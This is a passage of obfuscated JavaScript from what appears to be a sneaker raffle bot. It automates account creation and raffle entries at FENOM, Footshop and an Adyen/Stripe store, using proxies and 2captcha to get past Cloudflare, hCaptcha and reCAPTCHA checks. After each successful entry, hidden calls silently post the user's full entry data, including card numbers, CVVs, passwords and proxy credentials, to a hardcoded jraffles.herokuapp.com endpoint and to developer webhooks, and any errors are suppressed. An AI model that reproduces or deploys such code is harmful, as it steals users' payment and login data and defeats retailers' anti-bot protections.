                                _0x4a28b3 ? (console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1a4b1b['click']('#billingName'), await _0x1a4b1b['click']('#billingName'), await _0x1a4b1b['type']('#billingName', '' + _0x453ca6[_0x3771c6]['NameOnCard']), await _0x1e21d2(0x1f4), await _0x1a4b1b['click']('.__PrivateStripeElement'), await _0x1a4b1b['click']('.__PrivateStripeElement'), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CardNumber']), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['ExpiryDate']), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CVV'])) : (await _0x1a4b1b['click']('#firstName'), await _0x1e21d2(0x64), await _0x1a4b1b['click']('#firstName'), await _0x1e21d2(0x64), await _0x1a4b1b['click']('#firstName'), await _0x1e21d2(0x12c), await _0x1a4b1b['type']('#firstName', '' + _0x453ca6[_0x3771c6]['FirstName']), await _0x1e21d2(0x12c), await _0x1a4b1b['click']('#lastName'), await _0x1a4b1b['click']('#lastName'), await _0x1e21d2(0x352), await _0x1a4b1b['type']('#lastName', '' + _0x453ca6[_0x3771c6]['LastName']));
                            await _0x1e21d2(0x226), await _0x1a4b1b['click']('#paymentConsent'), await _0x1e21d2(0x226), await _0x1a4b1b['click']('#termsConsent'), await _0x1e21d2(0x2bc), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1a4b1b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1e21d2(0x2710);
                            try {
                                await _0x1a4b1b['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x1e21d2(0xbb8), await _0x1a4b1b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3cba3e => _0x3cba3e['click']()), await _0x1a4b1b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x174144 => _0x174144['click']());
                            } catch {
                            }
                            try {
                                await _0x1a4b1b['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x406375(_0x453ca6[_0x3771c6], _0x4909a3);
                            var _0x4e6ce0 = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', ![]), _0x49ff5e = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'pub', ![]);
                            let _0x2a9399 = _0x453ca6[_0x3771c6];
                            try {
                                prxdata = {
                                    'username': _0xf4f7bc['replace']('#', ''),
                                    'module': _0x4909a3['name'],
                                    'entrydata': JSON['stringify'](_0x2a9399),
                                    'proxy': '' + _0x32fd12[_0x3771c6]
                                };
                                var _0xa6641d = JSON['stringify'](prxdata);
                                let _0x3ab454 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0xa6641d, _0x3ab454);
                            } catch (_0x3fafef) {
                            }
                            const _0x3f300e = {
                                'succesDEVMSG': { 'embeds': [_0x4e6ce0] },
                                'succesPUBMSG': { 'embeds': [_0x49ff5e] }
                            };
                            try {
                                _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x3f300e['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x3f300e['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x3f300e['succesPUBMSG']);
                            } catch (_0x21cf0b) {
                                console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x21cf0b));
                            }
                            _0x24d7db = 'no';
                        } catch (_0x12e751) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20' + _0x12e751)), _0x38e390 = '' + _0x12e751;
                            var _0x37025f = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', !![], _0x38e390), _0x4e6ce0 = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', ![]), _0x49ff5e = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'pub', ![]);
                            const _0x5967e9 = {
                                'succesDEVMSG': { 'embeds': [_0x4e6ce0] },
                                'succesPUBMSG': { 'embeds': [_0x49ff5e] }
                            };
                            _0x5967e9['errorDEV'] = { 'embeds': [_0x37025f] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x5967e9['errorDEV']), await _0xa0452b(_0x5522d1, _0x5967e9['errorDEV']), _0x24d7db = 'yes';
                        } finally {
                            _0x2156db && _0x2156db['close']();
                            if (_0x24d7db == 'yes' && _0x21cecf != 0x5) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21cecf + '\x20/\x205)')), _0x3771c6 = _0x3771c6 - 0x1, _0x21cecf = _0x21cecf + 0x1;
                                continue;
                            }
                            _0x24d7db == 'yes' && _0x21cecf >= 0x5 && (_0x456859(_0x453ca6[_0x3771c6], _0x4909a3), _0x24d7db = 'no', _0x21cecf = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x128963, _0x5271df, _0x3198a8) {
                    var _0x574d26 = _0x5271df, _0x75b961 = 0x0;
                    for (var _0x3cf952 = 0x0; _0x3cf952 < _0x5271df['length']; _0x3cf952++) {
                        maxTasks = Number(_0x4558f2['threads']);
                        while (_0x75b961 >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        let _0x1e4842 = ![];
                        async function _0x527711(_0x49c222, _0x4803ba, _0x2bcc76, _0x4888bd, _0xc8c4e2) {
                            _0x75b961++, _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4558f2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x3d23c2 != 'yes')
                                var _0x3d23c2 = '', _0xc8c4e2 = 0x0;
                            var _0x400095;
                            try {
                                await _0x437e8(_0x4803ba, _0x4888bd);
                            } catch {
                                _0x3d23c2 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x4a5c1f(_0x49c222['name'] + '\x20Task\x20' + (_0x4888bd + 0x1) + '\x20/\x20' + _0x4803ba['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                            var _0x57213b = await _0x3d56af(_0x4803ba[_0x4888bd], _0x49c222, 'acc', ![]);
                            const _0x41e0d0 = { 'succesDEVMSG': { 'embeds': [_0x57213b] } }, _0x2324d7 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x4b4b07 = Math['round'](Math['random']() * (_0x2bcc76['length'] - 0x1)), _0x297f03 = _0x2bcc76[_0x4b4b07]['split'](':'), _0x482f9d;
                            async function _0xe5eaa4(_0x5d4c50) {
                                const _0x1d10dd = _0x534d99['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x2f1470 = _0x4d3f8b['parse'](_0x1d10dd, { 'header': !![] })['data'];
                                let _0x1953cf = ![];
                                for (var _0x294059 of _0x2f1470) {
                                    if (_0x294059['Email'] == _0x5d4c50['Email']) {
                                        _0x1953cf = !![];
                                        break;
                                    }
                                }
                                return _0x1953cf;
                            }
                            try {
                                if (await _0xe5eaa4(_0x4803ba[_0x4888bd]) == !![]) {
                                    console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1e4842 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x482f9d = await _0x16ed0a['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x297f03[0x0] + ':' + _0x297f03[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x482f9d = await _0x16ed0a['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x297f03[0x0] + ':' + _0x297f03[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x5a474a = await _0x482f9d['newPage']();
                                await _0x5a474a['setViewport']({
                                    'width': 0x500 + _0x54ffea(0x1, 0x32),
                                    'height': 0x2d9 + _0x54ffea(0x1, 0x32)
                                });
                                const _0x5c1c66 = await _0x5a474a['target']()['createCDPSession'](), { windowId: _0x5f0f6d } = await _0x5c1c66['send']('Browser.getWindowForTarget');
                                await _0x5a474a['authenticate']({
                                    'username': '' + _0x297f03[0x2],
                                    'password': '' + _0x297f03[0x3]
                                }), console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a474a['goto']('' + _0x2324d7, { 'waitUntil': 'networkidle2' }), console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1e21d2(0x1388);
                                var _0x2a764e = await _0x5a474a['$']('#turnstile-wrapper');
                                if (_0x2a764e) {
                                    console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1e21d2(0x2710);
                                    const _0x220186 = await _0x5a474a['$']('#turnstile-wrapper');
                                    if (_0x220186)
                                        try {
                                            await _0x220186['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x5a474a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x9e275e = await _0x5a474a['$']('#turnstile-wrapper');
                                        if (_0x9e275e)
                                            try {
                                                await _0x9e275e['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x5a474a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x5c1c66['send']('Browser.setWindowBounds', {
                                        'windowId': _0x5f0f6d,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x1e21d2(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x5a474a['type']('input[name=\x22firstname\x22]', '' + _0x4803ba[_0x4888bd]['FirstName']), await _0x1e21d2(0x1f4), await _0x5a474a['type']('input[name=\x22lastname\x22]', '' + _0x4803ba[_0x4888bd]['LastName']), await _0x1e21d2(0x1f4), await _0x5a474a['type']('input[name=\x22email\x22]', '' + _0x4803ba[_0x4888bd]['Email']), await _0x1e21d2(0x1f4), await _0x5a474a['type']('input[name=\x22password\x22]', '' + _0x4803ba[_0x4888bd]['Password']), await _0x1e21d2(0x258), await _0x5a474a['$eval']('input[name=\x22psgdpr\x22]', _0x21a00b => _0x21a00b['click']()), await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5a474a['$eval']('#customer-form', _0x545b27 => _0x545b27['submit']());
                                try {
                                    try {
                                        await _0x5a474a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x3d23c2 = 'no', console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Account\x20' + _0x4803ba[_0x4888bd]['Email'] + '\x20Generated')), _0x534d99['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x4803ba[_0x4888bd]['Email'] + ',' + _0x4803ba[_0x4888bd]['Password']);
                                    let _0x57222f = _0x4803ba[_0x4888bd];
                                    try {
                                        prxdata = {
                                            'username': _0xf4f7bc['replace']('#', ''),
                                            'module': _0x49c222['name'],
                                            'entrydata': JSON['stringify'](_0x57222f),
                                            'proxy': '' + _0x2bcc76[_0x4888bd]
                                        };
                                        var _0x709138 = JSON['stringify'](prxdata);
                                        let _0x31ee98 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x709138, _0x31ee98);
                                    } catch (_0x26ff2f) {
                                    }
                                    try {
                                        _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x41e0d0['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0xa0452b(_0x46ec81, _0x41e0d0['succesDEVMSG']);
                                } catch (_0x73c7d4) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x14e032) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20' + _0x14e032)), _0x400095 = '' + _0x14e032;
                                var _0x4e9fea = await _0x3d56af(_0x4803ba[_0x4888bd], _0x49c222, 'acc', !![], _0x400095);
                                _0x41e0d0['errorDEV'] = { 'embeds': [_0x4e9fea] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x41e0d0['errorDEV']), await _0xa0452b(_0x5522d1, _0x41e0d0['errorDEV']), _0x3d23c2 = 'yes';
                            } finally {
                                _0x482f9d && _0x482f9d['close']();
                                if (_0x3d23c2 == 'yes' && _0xc8c4e2 != 0x5)
                                    return console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Task\x20' + (_0x4888bd + 0x1) + '\x20:\x20Retrying\x20(' + _0xc8c4e2 + '\x20/\x205)')), _0xc8c4e2 = _0xc8c4e2 + 0x1, _0x75b961--, _0x527711(_0x49c222, _0x4803ba, _0x2bcc76, _0x4888bd, _0xc8c4e2);
                                _0x3d23c2 == 'yes' && _0xc8c4e2 >= 0x5 && _0x456859(_0x4803ba[_0x4888bd], _0x49c222), !_0x1e4842 && (console['log'](_0x1a8584() + '\x20[' + _0x49c222['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay'])), _0x75b961--;
                            }
                        }
                        _0x527711(_0x128963, _0x574d26, _0x3198a8, _0x3cf952), !_0x1e4842 && await _0x1e21d2(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x5639e6(_0x31d7a1, _0x36b0cc, _0x42442f) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x38c912 = 0x0; _0x38c912 < _0x36b0cc['length']; _0x38c912++) {
                        if (_0x2de002 != 'yes')
                            var _0x2de002 = '', _0x1d344d = 0x0;
                        var _0x1c1e87;
                        try {
                            await _0x437e8(_0x36b0cc, _0x38c912);
                        } catch {
                            _0x2de002 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x4a5c1f(_0x31d7a1['name'] + '\x20Task\x20' + (_0x38c912 + 0x1) + '\x20/\x20' + _0x36b0cc['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        const _0x3353a6 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x37ab90 = Math['round'](Math['random']() * (_0x42442f['length'] - 0x1)), _0x3527f2 = _0x42442f[_0x37ab90]['split'](':'), _0x18c908;
                        try {
                            _0x18c908 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3527f2[0x0] + ':' + _0x3527f2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x18c908 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3527f2[0x0] + ':' + _0x3527f2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2369e4 = await _0x18c908['newPage'](), _0x5c4827 = await _0x2369e4['target']()['createCDPSession'](), { windowId: _0x57e84 } = await _0x5c4827['send']('Browser.getWindowForTarget');
                            await _0x2369e4['authenticate']({
                                'username': '' + _0x3527f2[0x2],
                                'password': '' + _0x3527f2[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2369e4['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1e21d2(0x1388);
                            var _0x1746ee = await _0x2369e4['$']('.hcaptcha-box');
                            if (_0x1746ee) {
                                console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1e21d2(0x2710);
                                const _0x5ad9ba = await _0x2369e4['$']('.hcaptcha-box');
                                if (_0x5ad9ba)
                                    try {
                                        await _0x5ad9ba['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x2369e4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4629cb = await _0x2369e4['$']('.hcaptcha-box');
                                    if (_0x4629cb)
                                        try {
                                            await _0x4629cb['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x5c4827['send']('Browser.setWindowBounds', {
                                'windowId': _0x57e84,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1e21d2(0x1f40);
                            try {
                                await _0x2369e4['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x1e21d2(0x1388), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2369e4['type']('input[name=\x22email\x22]', '' + _0x36b0cc[_0x38c912]['Email']), await _0x1e21d2(0x1f4), await _0x2369e4['type']('input[name=\x22password\x22]', '' + _0x36b0cc[_0x38c912]['Password']), await _0x1e21d2(0x258), await _0x2369e4['$eval']('#login-form', _0x3da760 => _0x3da760['submit']()), await _0x2369e4['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1e21d2(0x1f4), await _0x2369e4['goto']('' + _0x36b0cc[_0x38c912]['Url']), await _0x2369e4['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x36b0cc[_0x38c912]['Size']);
                            if (_0x36b0cc[_0x38c912]['Size'] != 'RANDOM') {
                                var _0x108f9f = '\x20' + _0x36b0cc[_0x38c912]['Size'] + '\x20';
                                const _0x58f5c2 = await _0x2369e4['$x']('//span[contains(text(),\x20' + _0x108f9f + ')]');
                                await _0x58f5c2[0x0]['click']();
                            } else {
                                const _0x73803a = await _0x2369e4['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x2195dd = Math['round'](Math['random']() * (_0x73803a['length'] - 0x1));
                                await _0x73803a[_0x2195dd]['click']();
                            }
                            await _0x1e21d2(0x258), await _0x2369e4['click']('#cookieChoiceDismiss'), await _0x1e21d2(0x3e8), await _0x2369e4['type']('#instagram-account', '' + _0x36b0cc[_0x38c912]['Follower']), await _0x1e21d2(0x28a), await _0x2369e4['click']('#book-btn'), await _0x1e21d2(0xbb8);
                            try {
                                await _0x2369e4['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20' + _0x31f5da['cyan']('Solving\x20Captcha')), await _0x2369e4['solveRecaptchas'](), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1e21d2(0x7d0), await _0x2369e4['$eval']('#book-btn-for-sure', _0x551982 => _0x551982['click']()), await _0x1e21d2(0x12c), await _0x2369e4['click']('#book-btn-for-sure'), await _0x1e21d2(0xdac);
                            const _0x8f2cca = await _0x2369e4['$eval']('.reservation-popup\x20>\x20.title', _0x3e06dc => {
                                return _0x3e06dc['innerHTML'];
                            });
                            if (_0x8f2cca) {
                                _0x2de002 = 'no', _0x406375(_0x36b0cc[_0x38c912], _0x31d7a1), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x7ebd6e = await _0x3d56af(_0x36b0cc[_0x38c912], _0x31d7a1, 'dev', ![]), _0x44e065 = await _0x3d56af(_0x36b0cc[_0x38c912], _0x31d7a1, 'pub', ![]);
                                let _0xcc2b7e = _0x36b0cc[_0x38c912];
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'module': _0x31d7a1['name'],
                                        'entrydata': JSON['stringify'](_0xcc2b7e),
                                        'proxy': '' + _0x42442f[_0x38c912]
                                    };
                                    var _0x5e2679 = JSON['stringify'](prxdata);
                                    let _0x5f224d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x5e2679, _0x5f224d);
                                } catch (_0x273625) {
                                }
                                const _0x2d6b1a = {
                                    'succesDEVMSG': { 'embeds': [_0x7ebd6e] },
                                    'succesPUBMSG': { 'embeds': [_0x44e065] }
                                };
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x2d6b1a['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x2d6b1a['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x2d6b1a['succesPUBMSG']);
                                } catch (_0x4bbb5a) {
                                    console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4bbb5a));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x111726) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20' + _0x111726)), _0x1c1e87 = '' + _0x111726;
                            var _0x311046 = await _0x3d56af(_0x36b0cc[_0x38c912], _0x31d7a1, 'dev', !![], _0x1c1e87), _0x7ebd6e = await _0x3d56af(_0x36b0cc[_0x38c912], _0x31d7a1, 'dev', ![]), _0x44e065 = await _0x3d56af(_0x36b0cc[_0x38c912], _0x31d7a1, 'pub', ![]);
                            const _0x264e65 = {
                                'succesDEVMSG': { 'embeds': [_0x7ebd6e] },
                                'succesPUBMSG': { 'embeds': [_0x44e065] }
                            };
                            _0x264e65['errorDEV'] = { 'embeds': [_0x311046] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x264e65['errorDEV']), await _0xa0452b(_0x5522d1, _0x264e65['errorDEV']), _0x111726 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2de002 = 'yes');
                        } finally {
                            _0x18c908['close']();
                            if (_0x2de002 == 'yes' && _0x1d344d != 0x5 && _0x1c1e87 != 'Size\x20Not\x20Found') {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Task\x20' + (_0x38c912 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1d344d + '\x20/\x205)')), _0x38c912 = _0x38c912 - 0x1, _0x1d344d = _0x1d344d + 0x1;
                                continue;
                            }
                            _0x2de002 == 'yes' && _0x1d344d >= 0x5 && (_0x456859(_0x36b0cc[_0x38c912], _0x31d7a1), _0x2de002 = 'no', _0x1d344d = 0x0), console['log'](_0x1a8584() + '\x20[' + _0x31d7a1['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5aa907, _0x5d3f08, _0x596683) {
                _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4558f2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3e6a79 = 0x0; _0x3e6a79 < _0x5d3f08['length']; _0x3e6a79++) {
                    var _0x2d6c82;
                    if (_0x372bcc != 'yes')
                        var _0x372bcc = '', _0x140cf3 = 0x0;
                    var _0x3e15cf = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0xf4f7bc
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x5d3f08[_0x3e6a79]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5d3f08[_0x3e6a79]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4558f2['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2bc61f
                            }
                        ]
                    }], _0x25a327 = await _0x3d56af(_0x5d3f08[_0x3e6a79], _0x5aa907, 'dev', ![]), _0x132c0d = await _0x3d56af(_0x5d3f08[_0x3e6a79], _0x5aa907, 'pub', ![]);
                    const _0x769804 = {
                        'succesDEVMSG': { 'embeds': [_0x25a327] },
                        'succesPUBMSG': { 'embeds': [_0x132c0d] }
                    }, _0x279b1b = { 'embeds': _0x3e15cf };
                    try {
